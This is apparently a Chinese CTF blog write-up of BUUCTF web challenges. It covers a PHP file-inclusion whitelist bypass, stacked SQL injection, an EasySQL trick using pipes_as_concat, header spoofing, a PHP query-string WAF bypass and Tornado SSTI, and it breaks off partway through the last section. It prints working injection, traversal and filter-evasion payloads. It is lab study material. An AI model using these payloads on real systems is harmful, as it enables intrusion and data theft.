          </span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">			<span class="comment">/*in_array(search,array,type) 函数搜索数组中是否存在指定的值，</span></span><br><span class="line"><span class="comment">			白名单过滤，需要返回了ture</span></span><br><span class="line"><span class="comment">			所以这里我们传入的page或者是经过截断之后的page必须是soure.php或hint.php，</span></span><br><span class="line"><span class="comment">			这里是正常的访问，我们需要构造文件任意包含，所以这里传入的不满足条件，这里不是注意的点，往下继续看*/</span></span><br><span class="line">            </span><br><span class="line">            <span class="variable">$_page</span> = mb_substr( </span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>,  <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">			<span class="comment">/*这里mb_substr 是个截断，返回0到mb_strpos之间的内容，而mb_strpos 则是查找第一次出现的位置，所以基本可以理解为获取page 两个？之间的字符串，也就是获取file两个？之间的字符串，放到url中就是http://ip/?file=ddd?中的file=ddd*/</span>    </span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//这里和上面类似 查看_page 是否在白名单中</span></span><br><span class="line">            </span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);  <span class="comment">// 这里发现对_page进行了一次decode解码，</span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(			<span class="comment">//获取两个？？之间的内容</span></span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="comment">//先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为&#x27;?&#x27;，仍可通过第四个if语句校验。（&#x27;?&#x27;两次编码值为&#x27;%253f&#x27;），构造url：</span></span><br><span class="line">            <span class="comment">// 这里是我们要绕过的点，从这里往上看 尝试构造</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;<span class="comment">//白名单</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">/*必须满足if条件，才能包含file，这里也可以猜到可能考的是文件包含： </span></span><br><span class="line"><span class="comment">		1 REQUEST[&#x27;file&#x27;]不为空 </span></span><br><span class="line"><span class="comment">		2 REQUEST[&#x27;file&#x27;]是字符串</span></span><br><span class="line"><span class="comment">		3 checkFile($_REQUEST[&#x27;file&#x27;]) 为ture，回到checkFile 函数分析如何返回true*/</span>    </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>mb_strpos查找目标首次出现的位置，从0开始</p>
<p>mb_substr返回字符串，特别注意的是：mb_strpos获取的数字，在mb_substr不是从0开始，而是代表返回的长度</p>
<p><code>$page . &#39;?&#39;</code><br> 在PhP中，str1+.+str2即可将两个变量直接连接起来。</p>
<p>漏洞是include函数，利用文件包含漏洞，也就是需要include ffffllllaaaagggg文件，而且需要使用…/来绕过</p>
<p>我们知道如果直接放入source.php?ffffllllaaaaggg会通过checkFile的验证返回true，但是毫无疑问这种错误的文件名是无法被include正确读取的。<br>这个时候我们就要用到一个关键符号：/<br>例如：include ‘wrongname/flag.txt’<br>wrongname无法被正确读取，这个时候/后面的flag.txt就会被include函数读取并解析。</p>
<p>hint.php：可以得到提示，flag 在 <code>ffffllllaaaagggg</code> 里，但此时我们不知道flag的具体目录层次，因此构造时候需要通过</p>
<p>/index.php?file=source.php/../../ffffllllaaaagggg</p>
<p>依次通过…/…/构造尝试，去查看到底是几层的根目录。</p>
<p>尝试后，成功构造出payload如下：</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">index.php?<span class="keyword">file</span>=<span class="keyword">source</span>.php?..<span class="regexp">/../</span>..<span class="regexp">/../</span>../ffffllllaaaagggg</span><br><span class="line">或者<span class="keyword">file</span>=<span class="keyword">source</span>.php?<span class="regexp">/../</span>..<span class="regexp">/../</span>../ffffllllaaaagggg(根据文件名ffff猜是<span class="number">4</span>层根目录)</span><br><span class="line">    </span><br><span class="line">payload执行流程：此时<span class="keyword">file</span>=<span class="keyword">source</span>.php?..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>ffffllllaaaagggg</span><br><span class="line">第<span class="number">1</span>个<span class="keyword">if</span>返回<span class="keyword">false</span></span><br><span class="line">第<span class="number">2</span>个<span class="keyword">if</span>返回<span class="keyword">false</span></span><br><span class="line">$_page=<span class="keyword">source</span>.php 截取从<span class="number">0</span>到第一个？，刚好是<span class="keyword">source</span>.php</span><br><span class="line">第<span class="number">3</span>个<span class="keyword">if</span>返回<span class="keyword">true</span>，退出checkFile函数，此时核心代码中已满足<span class="keyword">if</span>(<span class="keyword">true</span>&amp;&amp;<span class="keyword">true</span>&amp;&amp;<span class="keyword">true</span>)，即执行<span class="keyword">include</span>函数</span><br><span class="line">最后<span class="keyword">include</span>(<span class="keyword">source</span>.php?..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>ffffllllaaaagggg)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>测试<code> 1&#39; or 1=1 #</code> ,初步判定存在SQL注入</p>
<p><code>1&#39; order by 1 #</code> ；字段数为2</p>
<p><code>1&#39; union select 1,2#</code>：<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p>
<p>接着尝试union注入,回显了过滤的关键字</p>
<p>堆叠注入：</p>
<p>①<code>0&#39;;show databases;#</code></p>
<p><img src="/2022/05/05/buu/image-20220505223612263.png" alt="image-20220505223612263"></p>
<p>然后用 show tables 尝试爆表。</p>
<p><code>0&#39;; show tables; #</code></p>
<p><img src="/2022/05/05/buu/image-20220505223743568.png" alt="image-20220505223743568"></p>
<p>可以看到这里有两个表，我们先尝试爆words表的内容。</p>
<p><code>0&#39;; show columns from words; #</code></p>
<p><img src="/2022/05/05/buu/image-20220505223940533.png" alt="image-20220505223940533"></p>
<p>然后报表 1919810931114514 的内容。</p>
<p>这里学到一个新知识点，表名为数字时，要用反引号包起来查询。</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>&#x27;; show columns <span class="keyword">from</span> `<span class="number">1919810931114514</span> `; <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/05/buu/image-20220505224136124.png" alt="image-20220505224136124"></p>
<p>之后有三个解题思路：</p>
<p>思路一：</p>
<p>1，通过 rename 先把 words 表改名为其他的表名。</p>
<p>2，把 1919810931114514 表的名字改为 words 。</p>
<p>3 ，给新 words 表添加新的列名 id 。</p>
<p>4，将 flag 改名为 data 。</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;; rename table <span class="built_in">words</span> <span class="keyword">to</span> word1; rename table `<span class="number">1919810931114514</span>` <span class="keyword">to</span> <span class="built_in">words</span>;alter table <span class="built_in">words</span> add <span class="built_in">id</span> int unsigned <span class="keyword">not</span> Null auto_increment primary key; alert table <span class="built_in">words</span> change flag data varchar(<span class="number">100</span>);<span class="comment">#</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/05/buu/image-20220505224447432.png" alt="image-20220505224447432"></p>
<p>思路二：</p>
<p>因为select被过滤了，所以先将</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="symbol">` 1919810931114514`</span> </span><br></pre></td></tr></table></figure>

<p>进行16进制编码，再通过构造payload得</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">SeT</span><span class="variable">@a</span><span class="operator">=</span><span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="keyword">prepare</span> execsql <span class="keyword">from</span> <span class="variable">@a</span>;<span class="keyword">execute</span> execsql;#</span><br></pre></td></tr></table></figure>

<p>进而得到flag</p>
<ul>
<li>prepare…from…是预处理语句，会进行编码转换。</li>
<li>execute用来执行由SQLPrepare创建的SQL语句。</li>
<li>SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。</li>
</ul>
<p><strong>思路三：</strong></p>
<figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;; handler <span class="string">`1919810931114514`</span> open as <span class="string">`a`</span>; handler <span class="string">`a`</span> read next;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$post</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$get</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$MysqlLink</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//GetPara();</span></span><br><span class="line">    <span class="variable">$MysqlLink</span> = mysqli_connect(<span class="string">&quot;localhost&quot;</span>,<span class="variable">$datauser</span>,<span class="variable">$datapass</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$MysqlLink</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Mysql Connect Error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$selectDB</span> = mysqli_select_db(<span class="variable">$MysqlLink</span>,<span class="variable">$dataName</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$selectDB</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Choose Database Error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$v</span>)&amp;&amp;is_string(<span class="variable">$v</span>))&#123;</span><br><span class="line">            <span class="variable">$post</span>[<span class="variable">$k</span>] = trim(addslashes(<span class="variable">$v</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//die();</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;a&gt; Give me your flag, I will tell you <span class="keyword">if</span> the flag is right. &lt;/ a&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;query&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$post</span>[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$BlackList</span> = <span class="string">&quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile</span></span><br><span class="line"><span class="string">        			|readfile|where|from|union|update|delete|if|sleep|extractvalue|</span></span><br><span class="line"><span class="string">    			    updatexml|or|and|&amp;|\&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">//var_dump(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&#x27;query&#x27;]));</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/<span class="subst">&#123;$BlackList&#125;</span>/is&quot;</span>,<span class="variable">$post</span>[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">            <span class="comment">//echo $post[&#x27;query&#x27;];</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Nonono.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$post</span>[<span class="string">&#x27;query&#x27;</span>])&gt;<span class="number">40</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Too long.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select &quot;</span>.<span class="variable">$post</span>[<span class="string">&#x27;query&#x27;</span>].<span class="string">&quot;||flag from Flag&quot;</span>;</span><br><span class="line">        mysqli_multi_query(<span class="variable">$MysqlLink</span>,<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span> = mysqli_store_result(<span class="variable">$MysqlLink</span>))&#123;</span><br><span class="line">                <span class="keyword">while</span>(<span class="variable">$row</span> = mysqli_fetch_row(<span class="variable">$res</span>))&#123;</span><br><span class="line">                    print_r(<span class="variable">$row</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">while</span>(@mysqli_next_result(<span class="variable">$MysqlLink</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>堆叠注入</p>
<p>有表flag；但是flag被过滤了</p>
<p>通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有||，也就是select 输入的数据||内置的一个列名  from 表名，进一步进行猜测即为select post进去的数据||flag from  Flag(含有数据的表名，通过堆叠注入可知)，需要注意的是，此时的||起到的作用是or的作用</p>
<p>解法1</p>
<p>输入的内容为*,1</p>
<p>内置的sql语句为sql=”select”.sql=”select”.post[‘query’].”||flag from Flag”;</p>
<p>如果$post[‘query’]的数据为*,1，sql语句就变成了select *,1||flag from Flag，也就是select *,1 from Flag，也就是直接查询出了Flag表中的所有内容</p>
<p>解法2</p>
<p>输入的内容为1;set sql_mode=pipes_as_concat;select 1</p>
<p>其中set sql_mode=pipes_as_concat的作用是将||的作用由or变为拼接字符串</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42373127/article/details/88866710">sql_mode</a></p>
<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>打开源码，有一个Secret.php，打开后：</p>
<p><img src="/2022/05/05/buu/image-20220506143959394.png" alt="image-20220506143959394"></p>
<p>bp或者hackbar修改请求头：<img src="/2022/05/05/buu/image-20220506144045568.png" alt="image-20220506144045568"></p>
<p><img src="/2022/05/05/buu/image-20220506144148137.png" alt="image-20220506144148137"></p>
<p>还要更换浏览器</p>
<p><img src="/2022/05/05/buu/image-20220506144307847.png" alt="image-20220506144307847"></p>
<p>还要在本地访问，更改访问的地址</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X</span>-Forwarded-For 是一个 HTTP 扩展头部。HTTP/<span class="number">1</span>.<span class="number">1</span>（RFC <span class="number">2616</span>）协议并没有对它的定义，它最开始是由 Squid 这个缓存代理软件引入，用来表示 HTTP 请求端真实 IP。如今它已经成为事实上的标准，被各大 HTTP 代理、负载均衡等转发服务广泛使用，并被写入 RFC <span class="number">7239</span>（Forwarded HTTP Extension）标准之中。</span><br><span class="line"></span><br><span class="line"><span class="attribute">X</span>-Forwarded-For 请求头格式非常简单，就这样：</span><br><span class="line"></span><br><span class="line"><span class="attribute">X</span>-Forwarded-For: client, proxy<span class="number">1</span>, proxy<span class="number">2</span></span><br><span class="line"><span class="attribute">X</span>-Forwarded-For: <span class="number">127.0.0.1</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/05/buu/image-20220506144507558.png" alt="image-20220506144507558"></p>
<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p><img src="/2022/05/05/buu/image-20220506150957107.png" alt="image-20220506150957107"></p>
<p>PHP的字符串解析特性</p>
<p>PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p>
<p>/news.php?%20news[id%00=42”+AND+1=0–</p>
<p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p>
<p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p>
<p>1.删除空白符</p>
<p>2.将某些字符转换为下划线（包括空格）</p>
<p>假如waf不允许num变量传递字母：</p>
<pre><code>http://www.xxx.com/index.php?num = aaaa   //显示非法输入的话
</code></pre>
<p>那么我们可以在num前加个空格：</p>
<pre><code>http://www.xxx.com/index.php? num = aaaa
</code></pre>
<p>这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。<br>首先我们要先扫根目录下的所有文件，也就是是scandir(“/“),但是“/”被过滤了，所以我们用chr(“47”)绕过,发现flagg文件</p>
<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">? num=var_dump(scandir(<span class="built_in">chr</span>(<span class="number">47</span>)));  <span class="comment">//f1agg文件</span></span><br><span class="line">我们利用<span class="built_in">chr</span>这个函数来构造函数内的字符串参数，就不需要用单双引号，从而成功绕过正则表达式。</span><br><span class="line"></span><br><span class="line">然后去读取这个文件就可以了，直接放patload：</span><br><span class="line">calc.php? num=<span class="number">1</span>;var_dump(file_get_contents(<span class="built_in">chr</span>(<span class="number">47</span>).<span class="built_in">chr</span>(<span class="number">102</span>).<span class="built_in">chr</span>(<span class="number">49</span>).<span class="built_in">chr</span>(<span class="number">97</span>).<span class="built_in">chr</span>(<span class="number">103</span>).<span class="built_in">chr</span>(<span class="number">103</span>)))</span><br><span class="line">或者：/calc.php? num=var_dump(file_get_contents(<span class="built_in">chr</span>(<span class="number">47</span>).f1agg));</span><br><span class="line">calc.php? num=highlight_file(<span class="built_in">chr</span>(<span class="number">47</span>).f1agg);</span><br><span class="line">calc.php? num=file_get_contents(<span class="built_in">chr</span>(<span class="number">47</span>).f1agg);</span><br><span class="line">calc.php? num=show_source(<span class="built_in">chr</span>(<span class="number">47</span>).f1agg);</span><br><span class="line"></span><br><span class="line"><span class="built_in">chr</span>()就是将ASCII码中的数字转化为其对应的字符,例如<span class="built_in">chr</span>(<span class="number">97</span>)就是字符<span class="string">&#x27;a&#x27;</span>。 </span><br></pre></td></tr></table></figure>

<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>打开题目后，首先发现3个超链接<img src="/2022/05/05/buu/image-20220506160034474.png" alt="image-20220506160034474"></p>
<p>依次打开：</p>
<p><img src="/2022/05/05/buu/image-20220506160056258.png" alt="image-20220506160056258"></p>
<p>网址里有参数<code>filename</code>和<code>filehash</code>推测这里flag应该是</p>
<p><code>filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(filename))</code>里面，filehash里<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=hash&spm=1001.2101.3001.7020">hash</a>就是提示为md5的hash加密</p>
<p>变量 filename 的值总是为要访问的文件，再根据提示三和 filehash 三个不同的值猜测 filehash 的值为<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=MD5&spm=1001.2101.3001.7020">MD5</a>加密后的字符串。</p>
<p>filename知道了，<code>cookie_secret</code>在哪呢？hints提示<code>render</code></p>
<p>又根据题目<code>easy_tornado</code>可推测是<strong>服务器模板注入。</strong></p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">扩展：SSTI注入</span><br><span class="line"></span><br><span class="line">SSTI就是服务器端模板注入(<span class="keyword">Server</span>-Side <span class="keyword">Template</span> Injection)，也给出了一个注入的概念。</span><br><span class="line"></span><br><span class="line">服务端模板：相当于很多公式，根据变量输出结果。这里的模板就是模板引擎根据数据自动生成前端页面。</span><br><span class="line"></span><br><span class="line">常见的注入有：<span class="keyword">SQL</span> 注入，XSS 注入，XPATH 注入，<span class="type">XML</span></span><br><span class="line">注入，代码注入，命令注入等等。<span class="keyword">sql</span>注入已经出世很多年了，对于<span class="keyword">sql</span>注入的概念和原理很多人应该是相当清楚了，SSTI也是注入类的漏洞，其成因其实是可以类比于<span class="keyword">sql</span>注入的。</span><br><span class="line"></span><br><span class="line"><span class="keyword">sql</span>注入是从用户获得一个输入，然后又后端脚本语言进行数据库查询，所以可以利用输入来拼接我们想要的<span class="keyword">sql</span>语句，当然现在的<span class="keyword">sql</span>注入防范做得已经很好了，然而随之而来的是更多的漏洞。</span><br><span class="line"></span><br><span class="line">SSTI也是获取了一个输入，然后在后端的渲染处理上进行了语句的拼接，然后执行。错误的执行了用户输入。类比于 <span class="keyword">sql</span></span><br><span class="line">注入。当然还是和<span class="keyword">sql</span>注入有所不同的，SSTI利用的是现在的网站模板引擎(下面会提到)，主要针对python、php、java的一些网站处理框架，比如Python的jinja2</span><br><span class="line">mako tornado django，php的smarty twig，java的jade</span><br><span class="line">velocity。当这些框架对运用渲染函数生成html的时候会出现SSTI的问题。</span><br><span class="line">因为render（）是tornado里的函数，可以生成html模板。是一个渲染函数 ，就是一个公式，能输出前端页面的公式。</span><br><span class="line"></span><br><span class="line"> tornado是用Python编写的Web服务器兼Web应用框架，简单来说就是用来生成模板的东西。和Python相关，和模板相关，就可以推测这可能是个ssti注入题了。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那我们开始初步尝试：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file?filename=/fllllllllllllag&amp;filehash=&#123;&#123;<span class="number">1</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>为什么使用双花括号?</p>
<pre><code>Tornado templates support control statements and expressions. Control
statements are surrounded by &#123;% %&#125;, e.g. &#123;% if len(items) > 2 %&#125;.
    Expressions are surrounded by &#123;&#123; &#125;&#125;, e.g. &#123;&#123; items[0] &#125;&#125;.
得到关键报错信息：
 ![image-20220506160641641](./buu/image-20220506160641641.png)

**模板注入必须通过传输型如&#123;&#123;xxx&#125;&#125;的执行命令**。探测方式很简单，给一个参数赋值`&#123;&#123;22*22&#125;&#125;`返回484则必然存在模板注入。

但是当我们输入`error?msg=&#123;&#123;1&#125;&#125;`就可以得到回显，说明此处是存在SSTI注入漏洞的。

![image-20220506160720515](./buu/image-20220506160720515.png)

当我构造的payload为：error?msg=&#123;&#123;2*2&#125;&#125;的时候，回显的结果是orz。因此我们可以猜测出，此处是出现了过滤。

此时我们需要找的是`cookie_secret`,搜素百度得Tornado框架的附属文件handler.settings中存在cookie_secret

Handler这个对象，Handler指向的处理当前这个页面的RequestHandler对象

    RequestHandler中并没有settings这个属性，与RequestHandler关联的Application对象（Requestion.application）才有setting这个属性
    
    handler 指向RequestHandler
    
    而RequestHandler.settings又指向self.application.settings
    
    所有handler.settings就指向RequestHandler.application.settings了！
此时构造payload:

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://e8d1f189-e498-4c03-9b0f-4eef7c6c671c.node3.buuoj.cn/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>

![image-20220506161033168](buu/image-20220506161033168.png)

7c8d1cbe-8dfc-4824-b465-79ce33c97f59

此时的payload应该就是如下通过md5的结果：

